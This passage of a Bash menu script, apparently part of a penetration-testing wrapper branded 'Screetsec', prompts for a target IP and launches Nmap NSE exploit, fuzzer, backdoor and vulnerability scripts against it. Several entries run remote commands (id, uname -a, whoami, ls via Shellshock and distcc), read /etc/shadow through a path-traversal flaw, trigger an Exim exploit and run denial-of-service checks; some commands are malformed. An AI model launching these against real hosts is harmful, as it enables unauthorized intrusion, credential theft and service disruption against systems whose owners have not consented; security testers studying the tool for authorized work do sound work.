          $xterm --script smb-vuln-cve2009-3103.nse -p 445 $ip &
        elif test $cin == '38'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script smb-vuln-ms06-025.nse -p 445 $ip &
        elif test $cin == '39'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script smb-vuln-ms07-029.nse -p 445 $ip &
        elif test $cin == '40'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script smb-vuln-ms08-067.nse -p 445 $ip &
        elif test $cin == '41'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script smb-vuln-regsvc-dos.nse -p 445 $ip &
        elif test $cin == '42'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script=smtp-vuln-cve2010-4344 --script-args="smtp-vuln-cve2010-4344.exploit" -pT:25,465,587 $ip &
        elif test $cin == '43'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p49152 --script supermicro-ipmi-conf $ip &
        elif test $cin == '44'
          then
           nse
        else
            echo ""
            echo -e $okegreen " Incorrect Number"
          fi
          echo ""
          echo ""
          echo -n -e $red " Back to Last Menu? ( Yes / No ) :"
        read back
        if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
            then
            clear
            menu
        elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
            then
            exploit
        fi
}


function fuzzer () {
  clear
  echo
  echo
  echo -e $white"	[$okegreen"01"$white]$cyan File dns-fuzz "
  echo -e $white"	[$okegreen"02"$white]$cyan File http-form-fuzzer	"
  echo -e $white"	[$okegreen"03"$white]$cyan File http-phpself-xss	"
  echo -e $white"	[$okegreen"04"$white]$cyan Back "
  echo -e " "
  echo -n -e $red'  \033[4mScreetsec@nse-fuzzer:\033[0m>> '; tput sgr0 #insert your choice
           read win
        if test $win == '1'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sU --script dns-fuzz --script-args timelimit=2h $ip &
        elif test $win == '2'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script http-form-fuzzer --script-args 'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}' -p 80 $ip &
        elif test $win == '3'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script=http-phpself-xss -p80 $ip &
        elif test $win == '4'
          then
           nse
        else
            echo ""
            echo -e $okegreen " Incorrect Number"
          fi
          echo ""
          echo ""
          echo -n -e $red " Back to Last Menu? ( Yes / No ) :"
        read back
        if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
            then
            clear
            menu
        elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
            then
            fuzzer
        fi
}


function malware () {
  clear
  echo
  echo
  echo -e $white"	[$okegreen"01"$white]$cyan auth-spoof	"
  echo -e $white"	[$okegreen"02"$white]$cyan dns-zeustracker	"
  echo -e $white"	[$okegreen"03"$white]$cyan ftp-proftpd-backdoor	"
  echo -e $white"	[$okegreen"04"$white]$cyan ftp-vsftpd-backdoor	"
  echo -e $white"	[$okegreen"05"$white]$cyan http-google-malware	"
  echo -e $white"	[$okegreen"06"$white]$cyan http-malware-host	"
  echo -e $white"	[$okegreen"07"$white]$cyan http-virustotal	"
  echo -e $white"	[$okegreen"08"$white]$cyan irc-unrealircd-backdoor	"
  echo -e $white"	[$okegreen"09"$white]$cyan smtp-strangeport	"
	echo -e $white"	[$okegreen"10"$white]$cyan back	"
	echo
  echo -n -e $red'  \033[4mScreetsec@nse-malware:\033[0m>> '; tput sgr0 #insert your choice
           read malw
        if test $malw == '1'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV --script=auth-spoof $ip &
        elif test $malw == '2'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm  -sn -PN --script=dns-zeustracker $ip &
        elif test $malw == '3'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm --script ftp-proftpd-backdoor -p 21 $ip &
        elif test $malw == '4'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm  --script ftp-vsftpd-backdoor -p 21 $ip &
        elif test $malw == '5'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -p80 --script http-google-malware $ip &
        elif test $malw == '6'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm  -sV --script=http-malware-host $ip &
        elif test $malw == '7'
          then
          echo
          echo -ne $okegreen " an API key acquired from the virustotal web page: " ; tput sgr0
          read key
          echo -ne $okegreen " a SHA1, SHA256, MD5 checksum of a file to check: " ; tput sgr0
          read sum
          $xterm --script http-virustotal --script-args="http-virustotal.apikey="$key",http-virustotal.checksum="$sum"" &
        elif test $malw == '8'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm-sV --script=irc-unrealircd-backdoor $ip &
        elif test $malw == '9'
          then
          echo
          echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
          read ip
          $xterm -sV --script=smtp-strangeport $ip &
        elif test $malw == '10'
        then
         nse
      else
          echo ""
          echo -e $okegreen " Incorrect Number"
        fi
        echo ""
        echo ""
        echo -n -e $red " Back to Last Menu? ( Yes / No ) :"
      read back
      if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
          then
          clear
          menu
      elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
          then
          malware
      fi
}


#!/bin/bash


function vuln () {


clear
echo
echo -e $white"	[$okegreen"01"$white]$cyan afp-path-vuln  "
echo -e $white"	[$okegreen"02"$white]$cyan broadcast-avahi-dos "
echo -e $white"	[$okegreen"03"$white]$cyan clamav-exec "
echo -e $white"	[$okegreen"04"$white]$cyan distcc-cve2004-2687 "
echo -e $white"	[$okegreen"05"$white]$cyan dns-update "
echo -e $white"	[$okegreen"06"$white]$cyan firewall-bypass "
echo -e $white"	[$okegreen"07"$white]$cyan ftp-libopie "
echo -e $white"	[$okegreen"08"$white]$cyan ftp-proftpd-backdoor "
echo -e $white"	[$okegreen"09"$white]$cyan ftp-vsftpd-backdoor "
echo -e $white"	[$okegreen"10"$white]$cyan ftp-vuln-cve2010-4221 "
echo -e $white"	[$okegreen"11"$white]$cyan http-adobe-coldfusion-apsa1301 "
echo -e $white"	[$okegreen"12"$white]$cyan http-aspnet-debug "
echo -e $white"	[$okegreen"13"$white]$cyan http-avaya-ipoffice-users "
echo -e $white"	[$okegreen"14"$white]$cyan http-awstatstotals-exec "
echo -e $white"	[$okegreen"15"$white]$cyan http-axis2-dir-traversal "
echo -e $white"	[$okegreen"16"$white]$cyan http-cross-domain-policy "
echo -e $white"	[$okegreen"17"$white]$cyan http-csrf "
echo -e $white"	[$okegreen"18"$white]$cyan http-dlink-backdoor "
echo -e $white"	[$okegreen"19"$white]$cyan http-dombased-xss "
echo -e $white"	[$okegreen"20"$white]$cyan http-enum "
echo -e $white"	[$okegreen"21"$white]$cyan http-fileupload-exploiter "
echo -e $white"	[$okegreen"22"$white]$cyan http-frontpage-login "
echo -e $white"	[$okegreen"23"$white]$cyan http-git "
echo -e $white"	[$okegreen"24"$white]$cyan http-huawei-hg5xx-vuln "
echo -e $white"	[$okegreen"25"$white]$cyan http-iis-webdav-vuln "
echo -e $white"	[$okegreen"26"$white]$cyan http-internal-ip-disclosure "
echo -e $white"	[$okegreen"27"$white]$cyan http-litespeed-sourcecode-download "
echo -e $white"	[$okegreen"28"$white]$cyan http-majordomo2-dir-traversal "
echo -e $white"	[$okegreen"29"$white]$cyan http-method-tamper "
echo -e $white"	[$okegreen"30"$white]$cyan http-passwd "
echo -e $white"	[$okegreen"31"$white]$cyan http-phpmyadmin-dir-traversal "
echo -e $white"	[$okegreen"32"$white]$cyan http-phpself-xss "
echo -e $white"	[$okegreen"33"$white]$cyan http-shellshock "
echo -e $white"	[$okegreen"34"$white]$cyan http-slowloris-check "
echo -e $white"	[$okegreen"35"$white]$cyan http-sql-injection "
echo -e $white"	[$okegreen"36"$white]$cyan http-stored-xss "
echo -e $white"	[$okegreen"37"$white]$cyan http-tplink-dir-traversal "
echo -e $white"	[$okegreen"38"$white]$cyan http-trace "
echo -e $white"	[$okegreen"39"$white]$cyan http-vmware-path-vuln "
echo -e $white"	[$okegreen"40"$white]$cyan http-vuln-cve2006-3392 "
echo -e $white"	[$okegreen"41"$white]$cyan http-vuln-cve2010-0738 "
echo -e $white"	[$okegreen"42"$white]$cyan http-vuln-cve2010-2861 "
echo -e $white"	[$okegreen"43"$white]$cyan http-vuln-cve2011-3192 "
echo -e $white"	[$okegreen"44"$white]$cyan http-vuln-cve2011-3368 "
echo -e $white"	[$okegreen"45"$white]$cyan http-vuln-cve2012-1823 "
echo -e $white"	[$okegreen"46"$white]$cyan http-vuln-cve2013-0156 "
echo -e $white"	[$okegreen"47"$white]$cyan http-vuln-cve2013-6786 "
echo -e $white"	[$okegreen"48"$white]$cyan http-vuln-cve2013-7091 "
echo -e $white"	[$okegreen"49"$white]$cyan http-vuln-cve2014-2126 "
echo -e $white"	[$okegreen"50"$white]$cyan http-vuln-cve2014-2127 "
echo -e $white"	[$okegreen"51"$white]$cyan http-vuln-cve2014-2128 "
echo -e $white"	[$okegreen"52"$white]$cyan http-vuln-cve2014-2129 "
echo -e $white"	[$okegreen"53"$white]$cyan http-vuln-cve2014-3704 "
echo -e $white"	[$okegreen"54"$white]$cyan http-vuln-cve2014-8877 "
echo -e $white"	[$okegreen"55"$white]$cyan http-vuln-cve2015-1427 "
echo -e $white"	[$okegreen"56"$white]$cyan http-vuln-cve2015-1635 "
echo -e $white"	[$okegreen"57"$white]$cyan http-vuln-misfortune-cookie "
echo -e $white"	[$okegreen"58"$white]$cyan http-vuln-wnr1000-creds "
echo -e $white"	[$okegreen"59"$white]$cyan http-wordpress-users "
echo -e $white"	[$okegreen"60"$white]$cyan ipmi-cipher-zero "
echo -e $white"	[$okegreen"61"$white]$cyan irc-botnet-channels "
echo -e $white"	[$okegreen"62"$white]$cyan irc-unrealircd-backdoor "
echo -e $white"	[$okegreen"63"$white]$cyan mysql-vuln-cve2012-2122 "
echo -e $white"	[$okegreen"64"$white]$cyan netbus-auth-bypass "
echo -e $white"	[$okegreen"65"$white]$cyan qconn-exec "
echo -e $white"	[$okegreen"66"$white]$cyan rdp-vuln-ms12-020 "
echo -e $white"	[$okegreen"67"$white]$cyan rmi-vuln-classloader "
echo -e $white"	[$okegreen"68"$white]$cyan samba-vuln-cve-2012-1182 "
echo -e $white"	[$okegreen"69"$white]$cyan smb-vuln-conficker "
echo -e $white"	[$okegreen"70"$white]$cyan smb-vuln-cve2009-3103 "
echo -e $white"	[$okegreen"71"$white]$cyan smb-vuln-ms06-025 "
echo -e $white"	[$okegreen"72"$white]$cyan smb-vuln-ms07-029 "
echo -e $white"	[$okegreen"73"$white]$cyan smb-vuln-ms08-067 "
echo -e $white"	[$okegreen"74"$white]$cyan smb-vuln-ms10-054 "
echo -e $white"	[$okegreen"75"$white]$cyan smb-vuln-ms10-061 "
echo -e $white"	[$okegreen"76"$white]$cyan smb-vuln-regsvc-dos "
echo -e $white"	[$okegreen"77"$white]$cyan smtp-vuln-cve2010-4344 "
echo -e $white"	[$okegreen"78"$white]$cyan smtp-vuln-cve2011-1720 "
echo -e $white"	[$okegreen"79"$white]$cyan smtp-vuln-cve2011-1764 "
echo -e $white"	[$okegreen"80"$white]$cyan ssl-ccs-injection "
echo -e $white"	[$okegreen"81"$white]$cyan ssl-cert-intaddr "
echo -e $white"	[$okegreen"82"$white]$cyan ssl-dh-params "
echo -e $white"	[$okegreen"83"$white]$cyan ssl-heartbleed "
echo -e $white"	[$okegreen"84"$white]$cyan ssl-known-key "
echo -e $white"	[$okegreen"85"$white]$cyan ssl-poodle "
echo -e $white"	[$okegreen"86"$white]$cyan sslv2-drown "
echo -e $white"	[$okegreen"87"$white]$cyan supermicro-ipmi-conf "
echo -e $white"	[$okegreen"88"$white]$cyan wdb-version "
echo -e $white"	[$okegreen"89"$white]$cyan back "
echo -e " "
echo -n -e $red'  \033[4mScreetsec@nse-vuln:\033[0m>> '; tput sgr0 #insert your choice
         read vuln
      if test $vuln == '1'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sV --script=afp-path-vuln $ip &
      elif test $vuln == '2'
        then
        echo
        $xterm --script=broadcast-avahi-dos &
      elif test $vuln == '3'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sV --script clamav-exec $ip &
      elif test $vuln == '4'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p 3632 $ip --script distcc-exec --script-args="distcc-exec.cmd='id'" &
      elif test $vuln == '5'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sU -p 53 --script=dns-update --script-args=dns-update.hostname=foo.example.com,dns-update.ip=192.0.2.1 $ip &
      elif test $vuln == '6'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm --script firewall-bypass --script-args firewall-bypass.helper="ftp", firewall-bypass.targetport=22 $ip &
      elif test $vuln == '7'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sV --script=ftp-libopie $ip &
      elif test $vuln == '8'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm --script ftp-proftpd-backdoor -p 21 $ip &
      elif test $vuln == '9'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm --script ftp-vsftpd-backdoor -p 21 $ip &
      elif test $vuln == '10'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        echo -ne $okegreen " What is your Port Target or Host: " ; tput sgr0
        read port
        $xterm --script ftp-vuln-cve2010-4221 -p $port $ip &
      elif test $vuln == '11'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p 80 --script http-adobe-coldfusion-apsa1301 --script-args basepath=/cf/adminapi/ $ip &
      elif test $vuln == '12'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm --script http-debug --script-args http-aspnet-debug.path=/path $ip &
      elif test $vuln == '13'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sV --script http-avaya-ipoffice-users $ip &
      elif test $vuln == '14'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sV --script http-awstatstotals-exec.nse --script-args 'http-awstatstotals-exec.cmd="uname -a", http-awstatstotals-exec.uri=/awstats/index.php' $ip &
      elif test $vuln == '15'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p 80 --script http-axis2-dir-traversal $ip &
      elif test $vuln == '16'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p 80 --script http-crossdomainxml --script-args http.domain-lookup=true $ip &
      elif test $vuln == '17'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p 80 --script http-csrf.nse $ip &
      elif test $vuln == '18'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sV --script http-dlink-backdoor $ip &
      elif test $vuln == '19'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p 80 --script http-dombased-xss.nse $ip &
      elif test $vuln == '20'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sV --script=http-enum $ip &
      elif test $vuln == '21'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p 80 --script http-fileupload-exploiter.nse $ip &
      elif test $vuln == '22'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm $ip -p 80 --script=http-frontpage-login &
      elif test $vuln == '23'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm sV -sC $ip &
      elif test $vuln == '24'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sV http-huawei-hg5xx-vuln $ip &
      elif test $vuln == '25'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm --script http-iis-webdav-vuln -p 80,8080 $ip &
      elif test $vuln == '26'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm --script http-internal-ip-disclosure --script-args http-internal-ip-disclosure.path=/path $ip &
      elif test $vuln == '27'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p 80,8080 --script http-litespeed-sourcecode-download --script-args http-litespeed-sourcecode-download.uri=/phpinfo.php $ip &
      elif test $vuln == '28'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p 80 --script http-majordomo2-dir-traversal $ip &
      elif test $vuln == '29'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p80 --script http-method-tamper --script-args 'http-method-tamper.paths={/protected/db.php,/protected/index.php}' $ip &
      elif test $vuln == '30'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm --script http-passwd --script-args http-passwd.root=/test/ $ip &
      elif test $vuln == '31'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p80 --script http-phpmyadmin-dir-traversal $ip &
      elif test $vuln == '32'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sV --script http-self-xss $ip &
      elif test $vuln == '33'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls $ip &
      elif test $vuln == '34'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm --script http-slowloris-check $ip &
      elif test $vuln == '35'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sV --script=http-sql-injection $ip &
      elif test $vuln == '36'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p 80 --script http-stored-xss.nse $ip &
      elif test $vuln == '37'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p80 --script http-tplink-dir-traversal.nse --script-args rfile=/etc/topology.conf -d -n -Pn $ip &
      elif test $vuln == '38'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm --script http-trace -d $ip &
      elif test $vuln == '39'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm --script http-vmware-path-vuln -p80,443,8222,8333 $ip &
      elif test $vuln == '40'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p80 --script http-vuln-cve2006-3392 --script-args http-vuln-cve2006-3392.file=/etc/shadow $ip &
      elif test $vuln == '41'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm --script=http-vuln-cve2010-0738 --script-args 'http-vuln-cve2010-0738.paths={/path1/,/path2/}' $ip &
      elif test $vuln == '42'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm --script http-vuln-cve2010-2861 $ip &
      elif test $vuln == '43'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm --script http-vuln-cve2011-3192.nse [--script-args http-vuln-cve2011-3192.hostname=nmap.scanme.org] -pT:80,443 $ip &
      elif test $vuln == '44'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm --script http-vuln-cve2011-3368 $ip &
      elif test $vuln == '45'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sV --script http-vuln-cve2012-1823 $ip &
      elif test $vuln == '46'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sV --script http-vuln-cve2013-0156 $ip &
      elif test $vuln == '47'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p80 --script http-rompager-xss $ip &
      elif test $vuln == '48'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p80 --script http-vuln-cve2013-7091 --script-args http-vuln-cve2013-7091=/ZimBra $ip &
      elif test $vuln == '49'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p 443 --script http-vuln-cve2014-2126 $ip &
      elif test $vuln == '50'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p 443 --script http-vuln-cve2014-2127 $ip &
      elif test $vuln == '51'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p 443 --script http-vuln-cve2014-2128 $ip &
      elif test $vuln == '52'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p 443 --script http-vuln-cve2014-2129 $ip &
      elif test $vuln == '53'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.uri="/drupal",http-vuln-cve2014-3704.cleanup=false $ip &
      elif test $vuln == '54'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm --script http-vuln-cve2014-8877 --script-args http-vuln-cve2014-8877.cmd="whoami",http-vuln-cve2014-8877.uri="/wordpress" $ip &
      elif test $vuln == '55'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm --script=http-vuln-cve2015-1427 --script-args command= 'ls' $ip &
      elif test $vuln == '56'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sV --script http-vuln-cve2015-1635 --script-args uri='/anotheruri/' $ip &
      elif test $vuln == '57'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm $ip -p 7547 --script=http-vuln-misfortune-cookie &
      elif test $vuln == '58'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sV --script http-vuln-wnr1000-creds $ip -p 80 &
      elif test $vuln == '59'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sV --script http-wordpress-users --script-args limit=50 $ip &
      elif test $vuln == '60'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sU --script ipmi-cipher-zero -p 623 $ip &
      elif test $vuln == '61'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p 6667 --script=irc-botnet-channels $ip &
      elif test $vuln == '62'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sV --script=irc-unrealircd-backdoor $ip &
      elif test $vuln == '63'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sV --script mysql-vuln-cve2012-2122 $ip &
      elif test $vuln == '64'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p 12345 --script netbus-auth-bypass $ip &
      elif test $vuln == '65'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm --script qconn-exec --script-args qconn-exec.timeout=60,qconn-exec.bytes=1024,qconn-exec.cmd="uname -a" -p $port $ip &
      elif test $vuln == '66'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sV --script=rdp-ms12-020 -p 3389 $ip &
      elif test $vuln == '67'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm --script=rmi-vuln-classloader -p 1099 $ip &
      elif test $vuln == '68'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm --script=samba-vuln-cve-2012-1182 -p 139 $ip &
      elif test $vuln == '69'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sU --script smb-vuln-conficker.nse -p T:139 $ip &
      elif test $vuln == '70'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sU --script smb-vuln-cve2009-3103.nse -p U:137,T:139 $ip &
      elif test $vuln == '71'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sU --script smb-vuln-ms06-025.nse -p U:137,T:139 $ip &
      elif test $vuln == '72'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sU --script smb-vuln-ms07-029.nse -p U:137,T:139 $ip &
      elif test $vuln == '73'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sU --script smb-vuln-ms08-067.nse -p U:137 $ip &
      elif test $vuln == '74'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p 445 $ip --script=smb-vuln-ms10-054 --script-args unsafe &
      elif test $vuln == '75'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm  -p 445 $ip --script=smb-vuln-ms10-061 &
      elif test $vuln == '76'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sU --script smb-vuln-regsvc-dos.nse -p U:137,T:139 $ip &
      elif test $vuln == '77'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm --script=smtp-vuln-cve2010-4344 --script-args="smtp-vuln-cve2010-4344.exploit" -pT:25,465,587 $ip &
      elif test $vuln == '78'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm --script=smtp-vuln-cve2011-1720 --script-args='smtp.domain=<domain>' -pT:25,465,587 $ip &
      elif test $vuln == '79'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm  --script=smtp-vuln-cve2011-1764 -pT:25,465,587 $ip &
      elif test $vuln == '80'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p 443 --script ssl-ccs-injection $ip &
      elif test $vuln == '81'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p 443 --script ssl-cert-intaddr $ip &
      elif test $vuln == '82'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm --script ssl-dh-params $ip &
      elif test $vuln == '83'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p 443 --script ssl-heartbleed $ip &
      elif test $vuln == '84'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm --script ssl-known-key -p 443 $ip &
      elif test $vuln == '85'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sV --version-light --script ssl-poodle -p 443 $ip &
      elif test $vuln == '86'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sV --script=sslv2-drown $ip &
      elif test $vuln == '87'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -p49152 --script supermicro-ipmi-conf $ip &
      elif test $vuln == '88'
        then
        echo
        echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sU -p 17185 --script wdb-version $ip &
      elif test $vuln == '89'
        then
         nse
      else
          echo ""
          echo -e $okegreen " Incorrect Number"
        fi
        echo ""
        echo ""
        echo -n -e $red " Back to Last Menu? ( Yes / No ) :"
      read back
      if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
          then
          clear
          menu
      elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
          then
          vuln
      fi
}


function nse	() {
clear
echo -e $okegreen " "
